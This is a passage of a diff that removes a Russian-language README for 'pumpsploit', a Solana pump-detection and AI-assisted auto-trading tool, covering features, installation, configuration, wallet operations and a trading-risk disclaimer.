-- Автоматическое выполнение покупки/продажи
-- Управление стоп-лоссами и тейк-профитами
-- Ребалансировка портфеля
-- Контроль управления рисками
-
-### 🏦 Управление кошельками
-- Поддержка нескольких кошельков
-- Безопасное управление ключами
-- Отслеживание балансов по токенам
-- Мониторинг истории транзакций
-- Функциональность импорта/экспорта кошельков
-
-### 📊 Продвинутая аналитика
-- Отслеживание производительности и статистика
-- Расчет и отчетность P&L
-- Анализ рыночных настроений
-- Расчет технических индикаторов
-- Анализ исторических данных
-
-### 🔧 Интеграция Jupiter DEX
-- Поиск лучших маршрутов для свопов
-- Защита от проскальзывания
-- Многоходовые торговые маршруты
-- Сравнение котировок в реальном времени
-- Оптимизация транзакций
-
-## 🚀 Установка
-
-### Предварительные требования
-
-- Node.js 18+ 
-- npm или yarn
-- Инструменты Solana CLI (опционально)
-
-### Быстрый старт
-
-```bash
-# Клонировать репозиторий
-git clone https://github.com/facexyzploit/pumpsploit.git
-cd pumpsploit
-
-# Установить зависимости
-npm install
-
-# Создать файл окружения
-cp .env.example .env
-
-# Настроить параметры
-npm run setup
-
-# Запустить приложение
-npm start
-```
-
-### Конфигурация окружения
-
-Создайте файл `.env` с вашей конфигурацией:
-
-```env
-# API ключи
-BITQUERY_API_KEY=ваш_ключ_api_bitquery
-JUPITER_API_KEY=ваш_ключ_api_jupiter
-
-# RPC эндпоинты
-SOLANA_RPC_ENDPOINT=https://api.mainnet-beta.solana.com
-CUSTOM_RPC_ENDPOINT=https://ваш_кастомный_rpc.com
-
-# Настройки торговли
-MAX_SLIPPAGE=0.5
-MAX_TRADE_SIZE=100
-ENABLE_AUTO_TRADING=false
-
-# Настройки ИИ
-AI_CONFIDENCE_THRESHOLD=0.7
-ENABLE_AI_ANALYSIS=true
-```
-
-## ⚙️ Конфигурация
-
-### Управление настройками
-
-Инструмент включает комплексный менеджер настроек, который позволяет настроить:
-
-- **Торговые параметры**: Лимиты проскальзывания, размеры сделок, уровни риска
-- **Настройки ИИ**: Пороги уверенности, предпочтения моделей
-- **RPC эндпоинты**: Пользовательские конфигурации Solana RPC
-- **Настройки уведомлений**: Уведомления о ценах и предпочтения
-- **Настройки безопасности**: Шифрование кошельков и контроль доступа
-
-### Быстрая конфигурация
-
-```bash
-# Доступ к меню настроек
-npm run settings
-
-# Или используйте интерактивное меню
-node bitquery-stream.js
-# Перейдите в Настройки > Конфигурация
-```
-
-## 📖 Использование
-
-### Базовое использование
-
-```bash
-# Запустить основное приложение
-npm start
-
-# Или запустить напрямую
-node bitquery-stream.js
-```
-
-### Опции главного меню
-
-1. **Мониторинг в реальном времени**
-   - Живое обнаружение пампов
-   - Анализ токенов
-   - Сканирование рынка
-
-2. **Инструменты торговли ИИ**
-   - Анализ ИИ
-   - Автоматическая торговля
-   - Генерация сигналов
-
-3. **Управление кошельками**
-   - Поддержка нескольких кошельков
-   - Проверка балансов
-   - История транзакций
-
-4. **Интеграция Jupiter**
-   - Свопы токенов
-   - Сравнение котировок
-   - Оптимизация маршрутов
-
-5. **Панель аналитики**
-   - Метрики производительности
-   - Торговая статистика
-   - Анализ рынка
-
-### Продвинутое использование
-
-#### Обнаружение пампов в реальном времени
-
-```javascript
-// Мониторинг живой активности пампов
-const pumpDetector = new PumpDetector();
-await pumpDetector.startMonitoring();
-
-// Настройка уведомлений
-pumpDetector.on('pumpDetected', (token) => {
-  console.log(`Обнаружен памп: ${token.symbol}`);
-});
-```
-
-#### Анализ на базе ИИ
-
-```javascript
-// Выполнить анализ ИИ токена
-const analyzer = new AIEnhancedAnalyzer();
-const analysis = await analyzer.analyzeTokenWithAI(tokenAddress);
-
-// Получить торговые рекомендации
-const recommendation = await analyzer.generateTradingRecommendation(analysis);
-```
-
-#### Автоматическая торговля
-
-```javascript
-// Инициализация автоматической торговли
-const autoTrader = new AutoTrading();
-await autoTrader.initialize();
-
-// Выполнение сделок на базе ИИ
-await autoTrader.executeTrade(signal, tokenAddress, walletAddress);
-```
-
-## 🧩 Модули
-
-### Основные модули
-
-- **`ai-enhanced-analyzer.js`**: Продвинутый анализ ИИ с моделями ML
-- **`auto-trading.js`**: Автоматическое выполнение торговли
-- **`jupiter-swap.js`**: Интеграция Jupiter DEX
-- **`wallet-manager.js`**: Управление несколькими кошельками
-- **`settings-manager.js`**: Управление конфигурацией
-
-### Модули анализа
-
-- **`ai-analytics.js`**: Рыночная аналитика на базе ИИ
-- **`statistics-display.js`**: Отслеживание производительности
-- **`connection-manager.js`**: Управление подключениями API
-
-### Торговые модули
-
-- **`quick-trading.js`**: Быстрое выполнение торговли
-- **`quick-actions.js`**: Общие торговые действия
-- **`ai-trading-integration.js`**: Интеграция торговли ИИ
-
-### Утилитарные модули
-
-- **`stream-handler.js`**: Потоковая передача данных в реальном времени
-- **`connection-display.js`**: Отображение статуса подключения
-- **`menu-handler.js`**: Интерактивная система меню
-
-## 🔌 Интеграция API
-
-### Поддерживаемые API
-
-- **Bitquery**: Данные блокчейна в реальном времени
-- **Jupiter**: Агрегация DEX и свопы
-- **Raydium**: Дополнительная интеграция DEX
-- **Birdeye**: Рыночные данные и аналитика
-
-### Конфигурация API
-
-```javascript
-// Настройка эндпоинтов API
-const config = {
-  bitquery: {
-    endpoint: 'https://graphql.bitquery.io',
-    apiKey: process.env.BITQUERY_API_KEY
-  },
-  jupiter: {
-    endpoint: 'https://quote-api.jup.ag/v6',
-    version: 'v6'
-  }
-};
-```
-
-## �� Торговые функции
-
-### Ручная торговля
-
-- **Быстрая покупка/продажа**: Быстрая торговля токенами
-- **Пакетная торговля**: Выполнение нескольких сделок
-- **Свопы токен-токен**: Прямые обмены токенов
-- **Сравнение котировок**: Поиск лучших торговых маршрутов
-
-### Автоматическая торговля
-
-- **Торговля по сигналам ИИ**: Выполнение сделок на основе анализа ИИ
-- **Торговля по моменту**: Следование рыночному моменту
-- **Арбитражная торговля**: Возможности арбитража между DEX
-- **Ребалансировка портфеля**: Автоматическое управление портфелем
-
-### Управление рисками
-
-- **Защита стоп-лосса**: Автоматическое предотвращение потерь
-- **Ордера тейк-профит**: Безопасное получение прибыли
-- **Размер позиции**: Управление позициями на основе рисков
-- **Лимиты портфеля**: Контроль максимального воздействия
-
-## 🤖 Аналитика ИИ
-
-### Модели машинного обучения
-
-- **Прогнозирование цен**: Статистические и нейронные сетевые модели
-- **Анализ настроений**: Оценка настроений в социальных сетях
-- **Оценка рисков**: Многофакторная оценка рисков
-- **Распознавание паттернов**: Обнаружение паттернов памп/дамп
-
-### Функции анализа
-
-- **Технические индикаторы**: RSI, MACD, полосы Боллинджера
-- **Анализ объема**: Паттерны торгового объема
-- **Рыночные настроения**: Отслеживание настроений в социальных сетях
-- **Оценка рисков**: Комплексная оценка рисков
-
-### Оценка уверенности ИИ
-
-```javascript
-// Получить оценку уверенности ИИ
-const confidence = await analyzer.calculateOverallConfidence(analysis);
-
-// Уровни уверенности
-// 0.8+ : Высокая уверенность - Сильный сигнал покупки/продажи
-// 0.6-0.8 : Средняя уверенность - Умеренный сигнал
-// 0.4-0.6 : Низкая уверенность - Слабый сигнал
-// <0.4 : Очень низкая уверенность - Избегать торговли
-```
-
-## 🏦 Управление кошельками
-
-### Поддержка нескольких кошельков
-
-- **Создание кошельков**: Генерация новых кошельков
-- **Импорт кошельков**: Импорт существующих кошельков
-- **Отслеживание балансов**: Мониторинг балансов в реальном времени
-- **История транзакций**: Полные журналы транзакций
-
-### Функции безопасности
-
-- **Шифрованное хранение**: Безопасное хранение ключей кошельков
-- **Контроль доступа**: Защита паролем
-- **Резервное копирование/восстановление**: Функциональность резервного копирования кошельков
-- **Аудит**: Полное логирование транзакций
-
-### Операции с кошельками
-
-```javascript
-// Создать новый кошелек
-const wallet = await walletManager.createWallet('МойКошелек');
-
-// Импортировать существующий кошелек
-const importedWallet = await walletManager.importWallet(privateKey);
-
-// Проверить балансы
-const balances = await walletManager.getTokenBalances(walletAddress);
-
-// Получить историю транзакций
-const history = await walletManager.getTransactionHistory(walletAddress);
-```
-
-## 📊 Отслеживание производительности
-
-### Торговая статистика
-
-- **Соотношение выигрышей/проигрышей**: Уровень успеха торговли
-- **Прибыль/убыток**: Отслеживание общего P&L
-- **Количество сделок**: Количество выполненных сделок
-- **Средняя доходность**: Средняя доходность сделки
-
-### Панель аналитики
-
-- **Метрики в реальном времени**: Живые данные производительности
-- **Исторический анализ**: Долгосрочные тренды производительности
-- **Метрики рисков**: Доходность с учетом рисков
-- **Анализ портфеля**: Разбивка распределения активов
-
-## 🔧 Разработка
-
-### Структура проекта
-
-```
-pumpsploit/
-├── modules/           # Основные модули
-├── settings/          # Файлы конфигурации
-├── wallets/           # Хранение кошельков
-├── temp/              # Временные файлы
-├── bitquery-stream.js # Основное приложение
-├── queries.js         # GraphQL запросы
-├── utils.js           # Утилитарные функции
-└── README.md          # Этот файл
-```
-
-### Добавление новых функций
-
-1. Создайте новый модуль в директории `modules/`
-2. Экспортируйте функции/классы из модуля
-3. Импортируйте и интегрируйте в основное приложение
-4. Добавьте опции меню для новых функций
-5. Обновите документацию
-
-### Тестирование
-
-```bash
-# Запустить тесты
-npm test
-
-# Запустить конкретный тест
-npm test -- --grep "AI Analysis"
-
-# Запустить с покрытием
-npm run test:coverage
-```
-
-## 🤝 Вклад в проект
-
-Мы приветствуем вклад! Пожалуйста, ознакомьтесь с нашими [Руководящими принципами вклада](CONTRIBUTING.md) для подробностей.
-
-### Как внести вклад
-
-1. Форкните репозиторий
-2. Создайте ветку функции
-3. Внесите ваши изменения
-4. Добавьте тесты для новых функций
-5. Отправьте pull request
-
-### Настройка разработки
-
-```bash
-# Установить зависимости разработки
-npm install --dev
-
-# Запустить линтер
-npm run lint
-
-# Запустить тесты
-npm test
-
-# Собрать проект
-npm run build
-```
-
-## 📄 Лицензия
-
-Этот проект лицензирован под MIT License - см. файл [LICENSE](LICENSE) для подробностей.
-
-## ⚠️ Отказ от ответственности
-
-**Торговля криптовалютами связана с существенным риском потери и не подходит для всех инвесторов. Стоимость криптовалют может как расти, так и падать, и вы можете потерять часть или всю вашу инвестицию.**
-
-Этот инструмент предназначен для образовательных и исследовательских целей. Всегда:
-- Проводите собственное исследование
-- Никогда не инвестируйте больше, чем можете позволить себе потерять
-- Понимайте связанные риски
-- Рассмотрите консультацию с финансовым советником
-
-## 📞 Поддержка
-
-- **Проблемы**: [GitHub Issues](https://github.com/facexyzploit/pumpsploit/issues)
-- **Обсуждения**: [GitHub Discussions](https://github.com/facexyzploit/pumpsploit/discussions)
-- **Документация**: [Wiki](https://github.com/facexyzploit/pumpsploit/wiki)
-
-## 🙏 Благодарности
-
-- Solana Foundation за инфраструктуру блокчейна
-- Jupiter за сервисы агрегации DEX
-- Bitquery за данные блокчейна в реальном времени
-- Сообщество открытого исходного кода за библиотеки и инструменты
-
----
-
-**Сделано с ❤️ для сообщества Solana** 
